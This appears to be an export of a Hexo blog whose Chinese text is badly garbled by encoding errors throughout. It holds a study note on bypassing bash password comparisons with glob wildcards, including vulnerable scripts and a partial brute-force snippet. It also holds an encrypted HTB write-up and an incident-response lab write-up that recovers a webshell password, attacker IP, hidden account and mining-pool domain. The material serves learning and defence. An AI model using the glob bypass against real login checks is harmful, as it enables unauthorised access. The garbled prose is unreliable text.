<p>é€»è¾‘å°±æ˜¯å®šä¹‰ä¸€ä¸ªpasswordï¼Œç„¶åæˆ‘ä»¬çš„è¾“å…¥ä¿å­˜åœ¨inputé‡Œï¼Œæ¯”è¾ƒinputå’Œpasswordçœ‹çœ‹oä¸ok</p>
<p>æ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬è¦okå°±åº”è¯¥è¾“å…¥â€˜qwe123â€™ï¼Œå’Œpasswordå»åŒ¹é…</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨åˆ°*, *åœ¨shellé‡Œå«globï¼Œä¹Ÿå«é€šé…ç¬¦ï¼Œ *çš„ä½œç”¨å¯ä»¥ç”¨æ¥åŒ¹é…ä»»ä½•é•¿åº¦çš„ä»»ä½•å­—ç¬¦ï¼Œç±»ä¼¼äºæ­£åˆ™é‡Œé¢çš„ *ï¼Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213816.png" ></p>
<p>åæ¥äº†è§£åˆ°globæœ‰å…¶ä»–å­—ç¬¦ï¼Œå„è‡ªæœ‰ä¸åŒçš„åŠŸèƒ½ï¼Œæ¯”å¦‚?å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ä¸²ï¼Œåœ¨æˆ‘çŸ¥é“å¯†ç é•¿åº¦çš„æƒ…å†µä¸‹è¾“å…¥nä¸ª?ï¼Œä¹Ÿèƒ½ç»•è¿‡</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213914.png" ></p>
<h5 id="æ²¡æ³•ç”¨çš„æƒ…å†µ1"><a href="#æ²¡æ³•ç”¨çš„æƒ…å†µ1" class="headerlink" title="*æ²¡æ³•ç”¨çš„æƒ…å†µ1"></a>*æ²¡æ³•ç”¨çš„æƒ…å†µ1</h5><p>å¦‚æœè„šæœ¬é•¿è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == &quot;$input&quot; ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„åˆ°$inputå‰åå¤šäº†å¼•å·</strong>ï¼Œè¿™ä¸ªæ—¶å€™å†ä½¿ç”¨*å»é€šé…å°±ä¼šå¤±è´¥</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423214332.png" ></p>
<p><strong>åŸå› æ˜¯ï¼šç»™$inputå‰ååŠ ä¸Šå¼•å·ï¼Œä¼šå¯¼è‡´*æ²¡åŠæ³•å±•å¼€ï¼Œæ‰€ä»¥é€šé…ä¸äº†ï¼Œè¿™ä¸ªæ—¶å€™åªèƒ½è¾“å…¥å’Œpasswordä¸€æ¨¡ä¸€æ ·çš„å­—ç¬¦æ‰èƒ½ok</strong></p>
<h5 id="æ²¡æ³•ç”¨çš„æƒ…å†µ2"><a href="#æ²¡æ³•ç”¨çš„æƒ…å†µ2" class="headerlink" title="*æ²¡æ³•ç”¨çš„æƒ…å†µ2"></a>*æ²¡æ³•ç”¨çš„æƒ…å†µ2</h5><p>è¿™ä¸ªæ—¶å€™çš„è„šæœ¬é•¿è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $input == $password ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>å¯¹æ¯”ç¬¬ä¸€ä¸ªè„šæœ¬ï¼Œåœ¨åˆ¤æ–­é‡Œé¢$input $passwordçš„ä½ç½®è°ƒæ¢äº†</p>
<p>è¿™ä¸ªä¸œè¥¿æœ‰ç‚¹æŠ½è±¡ï¼Œç¾¤ä¸»å½“æ—¶ç»™äº†ä¾‹å­</p>
<p>æˆ‘è‡ªå·±å¤ç°äº†ä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423215113.png" ></p>
<p>æ¥ä¸‹æ¥ç†è§£ä¸€ä¸‹ï¼š*.txtèƒ½å¤Ÿä»£è¡¨å¾ˆå¤šä¸ªtxtæ–‡ä»¶ï¼Œä»–ä¸èƒ½åªç­‰äº1.txtï¼Œæ‰€ä»¥noï¼Œä½†æ˜¯1.txtæ˜¯ *.txté‡Œé¢çš„ä¸€ä¸ªï¼Œæ‰€ä»¥å¯ä»¥ok</p>
<p><strong>é€šä¿—åœ°è®²å°±æ˜¯å¤šä¸ªæ–‡ä»¶ä¸èƒ½ç­‰äºç‰¹å®šçš„é‚£ä¸€ä¸ªï¼Œç‰¹å®šçš„ä¸€ä¸ªæ–‡ä»¶å±äºå¤šä¸ªæ–‡ä»¶é‡Œ</strong></p>
<p>å›åˆ°inputé‚£é‡Œï¼Œæˆ‘ä»¬ç»™ä»–è¾“å…¥*ï¼Œå°±ç¬¦åˆå¤šä¸ªå¯èƒ½å¯¹åº”ç‰¹å®šçš„ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸èƒ½ï¼Œæ‰€ä»¥not ok</p>
<h4 id="ç»•è¿‡çš„åº”ç”¨"><a href="#ç»•è¿‡çš„åº”ç”¨" class="headerlink" title="*ç»•è¿‡çš„åº”ç”¨"></a>*ç»•è¿‡çš„åº”ç”¨</h4><p>äº†è§£åˆ°ä¸‰ä¸ªç”¨æ³•ï¼Œæœ‰è¿™ä¸ªæ€è·¯å°±å¯ä»¥ç”¨æ¥çˆ†ç ´å¯†ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="built_in">all</span> = <span class="built_in">list</span>(string.ascii_letters + string.digits)  <span class="comment"># åˆ›å»ºåŒ…å«æ‰€æœ‰å­—æ¯å’Œæ•°å­—çš„å­—ç¬¦åˆ—è¡¨</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span>  <span class="comment"># åˆå§‹åŒ–å¯†ç ä¸ºç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">found = <span class="literal">False</span>  <span class="comment"># åˆå§‹åŒ– found å˜é‡ä¸º Falseï¼Œè¡¨ç¤ºå¯†ç å°šæœªæ‰¾åˆ°</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">				command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;password&#125;</span><span class="subst">&#123;character&#125;</span>*&#x27;ï½œå¯¹åº”çš„è„šæœ¬æ“ä½œ</span></span><br><span class="line"><span class="string">        ...åç»­çš„åˆ¤æ–­</span></span><br></pre></td></tr></table></figure>

<p>command &#x3D; fâ€echo â€˜{password}{character}*â€™æ³¨æ„è¿™é‡Œæœ€åå°±æ˜¯æœ‰ä¸€ä¸ª *å»é€šé…ï¼Œç„¶åä¸€ä½ä¸€ä½åœ°å»çˆ†ç ´å¯†ç </p>
<p>è‚¯å®šä¸æ­¢è¿™ä¸ªç”¨æ³•ï¼Œåç»­å¾…æ›´æ–°</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è‚¯å®šæ˜¯è¦æ„Ÿè°¢ç¾¤ä¸»çš„è€å¿ƒæŒ‡å¯¼</p>
<p>è¿™ä¸ªçŸ¥è¯†ç‚¹ç°åœ¨ç†è§£äº†å°±è§‰å¾—æ²¡ä»€ä¹ˆï¼Œä¸è¿‡è¿˜æ˜¯å€¼å¾—è®°å½•ä¸‹æ¥çš„</p>
]]></content>
      <tags>
        <tag>å­¦ä¹ ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-editorialå¤ç›˜</title>
    <url>/2024/06/19/htb-editorial%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1f921fbbff15c551a8e36907d0392b10be414ddb13375860e513c883c33aeb64">30d1cda685abf5401ce8be36443054c12d93976f3423e4fc2eaa996141e194c228ca43a8b7d26a1f93493ca3bcd37995a12b9b08d166b59923d687351280fae2b9f7a44bdc0f0f68965f100b64ec3f627364825ad97be1928b3365ba8136189009815fa798620c07e34b5e5f0570847edca367d8dce05442c88b37d61feb28a1c223668efdfe46f80f75b08af0db0af25625315516a4f2e8f970ec8fd430e7df1ed4e9914c8bb51f3f17bc5a8e6676b3b8d257ae946b3723aa9b26dd34276e5a0da1a3da5568d6c4e2cedd92132d2c79466b85c8f58ed06ad5e46f793e239e7375f24cd2df2cec775dbde5dd2269c05913bb6b82676b7afe0f6ec8e11324274845b2fbfc4a205835d03e8b5530e0a51bdfe03fb10352b449bdbe7292978e7ff1196aedc29226d2d69d702d9863b1002a00b4bce756da0cd90f3187f109206be9efd4212f2912eeb9faf30e1242bd0a6891de8d4a022089217fd60337cbd02493d2a31b9fdab3b04d3e52075d649801efcf14fc9e0181ff33a613a50d0de0963d9569c757d787cd2281750ccafe2d30187578b5263ad4ed1f2e100c1dae7c4759850262e10330148ab56fb8b692aa4d27ef67335e37c7b25802d5088f1a6fab9ba1010bd744cb209997c32c99531deeef2299722fef724919a6b0c12c985b80ed8cdebfae942b5d3a8dda2463799d38184b1679893314cd37286b2e2fbe48bc90553728377398ae98fd58816b53291b8aba5dd10618d30a6d0c14bfcb0867bdeb3f1670ed5a1d39bd975ae70764792821eb7234e91487beda0128a6dcc94a9a7be9a6263614ebfebec47757b94df8b70125719af900edcc4603e999399e5dd1dc0b30a5710c31d8dd44b90ca9bb77564e574a70a2f8c610b9d800208f8c2e6e85e39655b87333588149484825fb3543f5cadcce60993bcb33f116b207d29947a1266869f83c5122d8806325674577d09f743cac2043df2a888703cad4c0d4d115904d31e6b7c73c1248be2e9581363d794175d57d958fedc8c10b3a2896be5527830790bd133a2c02e17ca599d6cfd07879c8622d8e82c194bd9de1c33bf9b4a8bcbd313b649c65c5a19d1bdfab7dc7ef330bc68e6a140ff3e8a2a50334693736a0c9944b40c4be4ab35b6ea62a079b246e7995836febd0ec3980609fe47114549d815b6487363639cf1eaca255f37d7805e66d5480f280242a4fe2a5f77ff62fb7ac2f0c32b8ac81c0d8ab907834c71c6db1d5063eb5a8496386d9ed300f8f01c25c1b4efa9b2b064a9b097358b97cc8876f30fbec2067ea7f076eced0a14a20515d14484bb1f599f11f4c063a94acc1514ec1bdd9fddc10cf2efd665ba7cf342225c14d33903401499ac35097c8fd7e9af3d2059e32b877e644e6300815292e974d135ecd9630b3f19aaaa267488d5158c510a3a9a4fc21719698b2c1d4524d8a55f1acf87aa39fc01d5f344aeef640a4f98930d2e855736c7b945be61e3121ceaafe4b7996c0b0ada67a5100c4090aa5aef99837b634da6931ee62711a2a6eb9696b35e5cef37b1f20685f97a65d0d5d62a72d1066f930065aa794722973976bf3804619bedc0533fbde0f5bd7781a55aab3841431481337153fc5ef3bb2802c615b4ef8baeece20670dcc93c6ab3885efbd87be7fb7cda70d165247d8744de3e3d7c97955ad83e4b6bccc2619dce56b3ef8ba89b5cfcd01642d5995982478432fd83608ff62df2a2bd9193feb462447375adb1d0bab66079f5273c81d9e5aea1314a7217b71d7baf48c4b2a235e4f443f88c6bdc8f62dd8f4b30f4987b931b765cc810c49047d1a298d50477ded1e4ed1804f216ca3a19e82e2c2489a7319978a2459cfb59e79bf8703280d35dd7ee5b82f88bf07bef566081990f5ee24200f20e59c42649201ade30d76cf64a4bb07b61616267977af51a509bcd9610290f85ba87d91d7d97aa0cc692e435e054746c05eb61fd7d250dcebee0f16dc69b0f8a90db500d60900c3615350fdf05533ce471e6fe9a4c4b98f9823b0815f1b1d65bd34f84e114a288ab346a39d08821ea5b07578777a63afabea9f82a59fc9e051454ea64d5bbb6f4584cfbb202372a41009d9b1794aac745fc27914e5da4d5e0000aa66eddd8d31b47e58c5a17771b5ba8aa68df261af92912202e5ecebe2eb443260a553fcedb3003e4431d4db4095208c93b5539fffbc17f86927387870402fe282d45c8776f24ed67bbe9512d45f65dbabcd601fa62b68d2ed1212a3e1d5dad8723846840f7e7b6c24bb422600acd26d82f76b688ea155015ef7a5cdbeee387b7a8cee3f3f7d4ae4a9a5e421a2db6cc2f06bc6c26e8ddebd4c8ad27ab6cc486efbc94cf46896845c8db97a28c1b091571f1f44157e09476afa7b29e19a80193d10b9402da6f48473e9b79176ff5f2eaaeb9b639457db2885c71ce790b3f4b72fec20ed8c7182d92c24f55c2ae159d39acca0011eb67759d30e773df5874cf15bb94541e2a6975b5c622f397ff48e773aee739f0cdb02f64342152b0f4a6418cf42a25d89159032fc175a090f646682651ba8e0d6e48f748d16c6f685a4cc2f36671d0d4c87987821f5f198075eb5d75309dc0d64e9ae0b9977b1be626e4efb3f1c76469495f681b450fd78f3124919bdff066f2877caf9ebf2703c62de9537c07bc2ac77cf2a238ec50411acd40364ee6e7f8d0120de5661114b95163627b8f226beadb3738cc29ea078c3047f4293d28f4c7c44841915b5de99311cde785c221e6e41ed9a29588eeb6a6c44200554a14a74d7df9437edd70f9c501274448781e15dc6946942937b4135a2229dc1edb284e5225cd4212b044ceffdc09940cd4df71ae525993e47b1ea25c1490e484d1597d6fdd92bf04745a05fa01decd79cd739576627ad54d251b2f3b467c391aca7d8550455caf00f604b90b6d232841a873c18eaf25e4b6735f0b440d1e22b28c2eaa0b9481346a60c921c96413012254d9d26823f9a52fd020e8024dc16d01ba46772ab65c813a193a8b2bae580ae8e933c776656b9ed56bb251b41c671ae3b1f895807d1b7ca0354fb5b985893ff5f0fa8fa87b630e51d1b3379c5618854d5e17abb4a6bfb2c066b2857aaeb03ac068c2e5d465dec7ffca6c99934839e41fd23ea243bcab34e25421948aea7497e97ea706b4da94188634b8a58edb3fcfc12dbddf27513ed77b86beb9fef9f86838f5634e17b926bf92d3f57b6fbd8ce6d581c1891cea5c68595ff5f529747baee59103767463497ee6996d854193357195371fd5c42264925919373cf78f1d93f5a94f88c5bd6cafbc870a2534a8b627539f1a9a2602cb0ea83450d9ec3a9ea7a3b762237f57d464d17666ac7821b685620663cbd38292ddf34e93b366091c819c4adc8b305ada6f7003899e813affe3ffaf9ba08b228d4bd53a9ee70fa294d321e27ee4e4ad05d9665d4af935fd55746718755f41be6f309950ebd4eb9258609655b6cf50eac37a26d82466d95c1f77c43cd1463683dfa0329fac30f76edb5d91db80f3d3767556a0441e31a08a6f069abbba522eb886244d39f2107ac4304acfeaa0d6fbfcaf76500134ab71c9f5114b7661f39bea7e842641a4f222402c7358a213135f49d8d2238ea232837fcabb27e19206a82f8aa6c093b39fd65438d448f785e49c4ab53d769e8a01d5db42115b77a4c69516d5b48100d982f4aed4545530c9efb79d501c248385e6c461f9dc0d3a1b2b87c91f90f9bef8be386ccf681e7403f6b09d2bf2383486e4cf336aae791dee54c71db5b4ad509c3e41383323397277a6abe7c7bab9b9e2c6ee410737a6992abaa31f85a07855af4e156d05455ee7e73148aee046b631f45b8435960a463601121f8b4999295ed643e3610122b7de62cbd3e5b3621f3cf56fef37c552e586b262d0188d191bb634e985f3394ec5b345b4eea3c1e7355a290024dafc8151982e969204e8265f8a463b7d837cbe085ceaea42ffd37f22d4f3c413db42cd79643d1faad8cdce2bca5d5e04fbeb133cb72d658452ded410c566937cea38b6d8397ba6be710f9f283419e0276be07756b326103690b6d11e913ee5979cd65cda169f35d55f40cd62819db0de39fbf09b9a3baf7d75e77a753ecfdc14636e3c2f606303efcf6d80d41768fa450e0090dcca7295cac63c57293839b7b3997fb828cc75d9ecc8049a450c38f2af860765863ebcef36daff903af3a7a1e33184989f238e6a75444b276683cd5b5372c2c8930127aabbece31f349a174616bb653a8ab438263c0cdd26d1260feb3778c0b13bc61a31e5edd9f4b1c5e4bbfd21d7c832df6f0606c8bfa8a2e8d9f3275b7bb3ad66862406298b1599361dd480ccf4b6133395b5046e3643eac2d448eb0608deaf0e2d3cddb462e3240847cf13a1e71f81d99efb3429c9b0e1bbb630d47b3e05b9631fae712f6640bd89594020421ad2d6aa3cf2e2f3380605f8180e950310ef019e95e6c403ba94c03de62fb21c135f3c37d17baeb804890944027dd78e60753bbf0a5702d790455dc81d9ec78bbc7f6f5af64d6e236a18495ca21797da3bef14ac3b26f380c8f35102eb42897fb7b6c71fb01c65e1c85982a71938848689773f42dad6ceceef5dbe85a6eb043378f3735bf7c68bf5874464b5ec3c46356f98c124bd2d49672cc05eb2fc8a1a5c7a7e30dfd5b3dd73e820633735bc49baee77e445eb38b22446a02a1178f238cd1561c1b206748c0db33d6a4cbb70324e1d5e26e16f3539684c0207f824e048db4252152c97ba71c61be565f24935511243bdf7104f9b3f35ff36226a82c649a5e255dfd4f2979034c06624658734de4e61f3413156823d321710e2076c7931d7d65f25475078ad1dbdcbf658f2f84210520ddb9b083d18a1c8fef3c8a1903d8cf30e26ecdbeb5884125b16efda25bb7210b7b34ecaec3bb2640efb9c52eb4cd63dea558f44f6a956038b9f393288272d67070e38a879cf8765fa9dbe992a88d38abfbd4ecc521051d2190c1b0bce3e40ce16a960ee162bb655ff5f3164c448ad59ac70ec6f207c09bb5cedd73fad65f23c8ca8c71ae4d6bc48c98a8b6903862299929336681e90a1a12c0dac9661a3dbd0ed4020c407efed17cb1bdc5a43a541ab08a2d500aeb9f587c1165d1c53d4fdc8c76e2fe5cb9eb72e03727e75ff5c7d55101279849be93a14c89821c996c78ef661afa9e21acec30d1ff312e4a32fe8274e5360bb4b5258c65706d2dcedcc816b6ea0ab4a52fba9798db33ddc98d646fcd2c275db029e2047a89eedcdb9a93febbbd48830582321a08459c6b1a8dcbe9c844832b2365a213ac60ea72454b7667682e259a0f91edf64af477ffb4c200e6d4fe2d6037b714b2ea0e5f7d98a128b3517cbd78f4962dea4248926ed5915b9b2662cc734ea48a8b28dc215ad21a509b0265cf0e63ee7892e5eec887c8c782812c18cedeb534061739221a0afb7f518d38650ba8855d1fd378d8a0ab1e5ee94ad597524e5a91e1e0d2f2494c539ee8a4ee08abc16571610376002b2bb9919854b54349347e58644ca966b6174809c703c16aa22fdcbd824ebd7d9bef071da68fef34d803216949415f0507bd3e9212ba9e77410af0e22cde110832889689f1dcc7e9ba290b9eaba719e457440f9ba1290e5f876b96520a2a9047a1f98b83bf204038c65574e60b16b384bdfe4c15655ca82cc228621f3cfd6bb8f1b676eafc3818ceb8c2e71d1dd256fcac044606ac7b26a5c91bd7b948ef0ed19b68d517b9bae21c03da437a9d01920eac393f19d32dcc3175a3b707f800b8ae176660e073624260ff8f413c9513c5d354eb5969495e82fc135a61796cbe5cac97f3e38e0d985a20de5e05b3292e5ebf105dbbec24bd9586b1c505544e8552623d540862b07083a54a16e254bb9ae5d566e224fe6431ef11c4160374e04aa5275e5f59ec51d57fd5fc5dfdc6af512a48575eec4f08db09a976b9daa2e75f6c8184aa41ce5ea0853cd9bd02da93ac89ad167ed6c53a186313bf48fc374b70dbb55c5f5b46caa343ee6561b826b8803abcbb0ddb55693b1b4db30bcaf36ac6d23ab150b9721c607d6399a4f461fcb4e9f774e7b2460ebcb05c77c4b9bd3c986f06180b141485bb4f969c1fe6af5f4e759e3bd19cd23ec697bd3ad9fb9c69ef028a50e77053df3316ae48eb771eb4736e7e66e5e6b8afd24aa20c7633d75433a40f3d9d3c3222c14b218a8202fc2b951e29201f2a175075388225d7e968dad1c7a273daf5a509bf7c3ace25b856321a3cd0afec8cb635385158bb24cb6f69b815540b930b2d843350088d1c85017e4ff47495bff9a01105b248872bffd18f294ddc0a03cbba68ab3c277d02431824254e2b991f94dbaa88c91c9c7fe4abeb6f5dcfb32c144bb98827e6e41742fd72372089550680813dd05fa65f1d4d8583667c5fd9ae98bf11fdcad8e5ad3232ded82de1ed5f2796f8d2632aad0bbe6275f78f124351f6f17238521c76591cb7df5f456b0e4376c816ffb9763d2f9f27277de5834ab1f8dd9dffc78f60bb0c21218cd254e621f847f37349271201a5c7fedad0a633271b33050f50b613f33a2efc66531f2356d9368b7f2537e8a53a969a7c2de856ce66f54968836e1f6f45bab316064663c54996f802bb8cb48d8d1ceed44d3b991e40afc0241c35da01ededc319cc14bd6c2cabc3afe514b382a13267103cb12da6b89d2368653e188e3568a4d85fcf86e5df654904508e2d01225cdce64b372cc8ee03e116f5d2185236a0d4be24313ad6162942332b98432d5a9c95665950b2c9a01bb357df2bc665c6f84cf6163a7c73bbd35510155ebc380af5086853c2da99997c1ce3be0229e4b005db1369f31b1c80bc2ad38634f506dfd2029e9ad2e24b1d6fc72613896b2e59d5a04919fb0d17340f78929b8d0c6679ca294339a9d21db19d2ad7005f8d72c317f2b040191aeecacb97cb1ece5dda0512a0e2aa3b6eed3fca02acff11b02f58cfc15eed24f1ea1a03d1b3f588d6a257ebbad2e0e742158ebe845b298e16c038ccde80ecb30667e432b80a4e054a596aba6b480b9d941f42c5949f0d5c318477b52674b19ef5203c47465d0964e73a5f761722869a681a418d07d3e055d0881d7a3100a1483c99433687185f8fa5de58c0795e6883ee14aa6ddfa0826f501583a47fc63c5d1535403cb1e218782f358b05940841c18e830715e7e233c59d38256231c2de7c88f52e00aa1ed583cdcfcd2c9971ded50e2d066c81ee3bf9d064b2d6e6c3e0fdb1bc7579143aba65c655dd4844a1b3d17e877263019b51f6dc6ee457281b665163d6d57b171ba9e5d9628be06f945aac8dbe6778d5bf5fcf3cb3d7e3c0f6d4205d3abba73d6b4496c3b69e9540cfb8bdacfac0811dfa37765d9cfeca0be12d348515d03c08b416d1fd4d96f517a465b22e5fe686868f3622209c68bcf7eced08a5b17725bcf28c04923a8344a873a79fca58696563031786dc93ec4f2a7d718fcb8d062f1007555de5e909ca9b195023380904774b35600004442688fe6d6484f3b9d6adfaea5c8a4e811e03ff37cf0e0487b40d07b04fabdb450af3c70b24d90b79b8ecd03acff9f023b366d4e3883b216f2411ee031372</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
      </tags>
  </entry>
  <entry>
    <title>ç„æœº-windowså®æˆ˜</title>
    <url>/2024/06/01/%E7%8E%84%E6%9C%BA-windows%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h3 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h3><p>å…ˆè¿œç¨‹æ¡Œé¢è¿æ¥ï¼Œç”¨å¾®è½¯çš„remote desktopè¿˜æŒºæ–¹ä¾¿</p>
<h4 id="æ‰¾åˆ°é»‘å®¢æ¤å…¥-shell-å°†é»‘å®¢æ¤å…¥-shell-çš„å¯†ç -ä½œä¸º-FLAG-æäº¤"><a href="#æ‰¾åˆ°é»‘å®¢æ¤å…¥-shell-å°†é»‘å®¢æ¤å…¥-shell-çš„å¯†ç -ä½œä¸º-FLAG-æäº¤" class="headerlink" title="æ‰¾åˆ°é»‘å®¢æ¤å…¥ shell,å°†é»‘å®¢æ¤å…¥ shell çš„å¯†ç  ä½œä¸º FLAG æäº¤;"></a>æ‰¾åˆ°é»‘å®¢æ¤å…¥ shell,å°†é»‘å®¢æ¤å…¥ shell çš„å¯†ç  ä½œä¸º FLAG æäº¤;</h4><p>ç”¨dç›¾æŸ¥æ€ï¼Œæ‰¾åˆ°shell.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601143330.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141231.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;rebeyond&#125;</span><br></pre></td></tr></table></figure>

<h4 id="åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„-IP-ä¸ºå¤šå°‘-å°†é»‘å®¢-IP-ä½œä¸º-FLAG-æäº¤"><a href="#åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„-IP-ä¸ºå¤šå°‘-å°†é»‘å®¢-IP-ä½œä¸º-FLAG-æäº¤" class="headerlink" title="åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„ IP ä¸ºå¤šå°‘,å°†é»‘å®¢ IP ä½œä¸º FLAG æäº¤;"></a>åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„ IP ä¸ºå¤šå°‘,å°†é»‘å®¢ IP ä½œä¸º FLAG æäº¤;</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141541.png" ></p>
<p>è¿™ç§å°±æ˜¯çœ‹æ—¥å¿—ï¼Œæ‰¾åˆ°phpstudyè·¯å¾„ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141733.png" ></p>
<p>éšä¾¿ä¸€çœ‹å°±æ˜¯192.168.126.1è¿™ä¸ªipä¸€ç›´åœ¨è®¿é—®shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.126.1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="åˆ†æé»‘å®¢çš„éšè—è´¦æˆ·åç§°-å°†é»‘å®¢éšè—è´¦æˆ·åç§°ä½œä¸º-FLAG-æäº¤"><a href="#åˆ†æé»‘å®¢çš„éšè—è´¦æˆ·åç§°-å°†é»‘å®¢éšè—è´¦æˆ·åç§°ä½œä¸º-FLAG-æäº¤" class="headerlink" title="åˆ†æé»‘å®¢çš„éšè—è´¦æˆ·åç§°,å°†é»‘å®¢éšè—è´¦æˆ·åç§°ä½œä¸º FLAG æäº¤"></a>åˆ†æé»‘å®¢çš„éšè—è´¦æˆ·åç§°,å°†é»‘å®¢éšè—è´¦æˆ·åç§°ä½œä¸º FLAG æäº¤</h4><p>æ€è·¯å¯ä»¥çœ‹ç”¨æˆ·è¡¨æˆ–è€…ç›´æ¥çœ‹ç”¨æˆ·ç›®å½•ä¸‹å¤šäº†ä»€ä¹ˆ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601142716.png" ></p>
<p>æœ‰ä¸ªhacker138</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601142902.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hacker138&#125;</span><br></pre></td></tr></table></figure>

<h4 id="åˆ†æé»‘å®¢çš„æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå-å°†é»‘å®¢æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸåç§°ä½œä¸º-ä»…åŸŸå-FLAG-æäº¤"><a href="#åˆ†æé»‘å®¢çš„æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå-å°†é»‘å®¢æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸåç§°ä½œä¸º-ä»…åŸŸå-FLAG-æäº¤" class="headerlink" title="åˆ†æé»‘å®¢çš„æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå,å°†é»‘å®¢æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸåç§°ä½œä¸º(ä»…åŸŸå)FLAG æäº¤;"></a>åˆ†æé»‘å®¢çš„æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå,å°†é»‘å®¢æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸåç§°ä½œä¸º(ä»…åŸŸå)FLAG æäº¤;</h4><p>æ€è·¯æ˜¯å»é»‘å®¢æ–°å¢çš„ç”¨æˆ·ç›®å½•ä¸‹çœ‹çœ‹æœ‰ä»€ä¹ˆï¼Œåœ¨æ¡Œé¢ä¸‹å‘ç°â€œkuangâ€æ–‡ä»¶</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601143018.png" ></p>
<p>ç”¨å·¥å…·åç¼–è¯‘ä¸€ä¸‹å°±èƒ½çœ‹åˆ°çŸ¿æ± åŸŸå</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;wakuang.zhigongshanfang.top&#125;</span><br></pre></td></tr></table></figure>

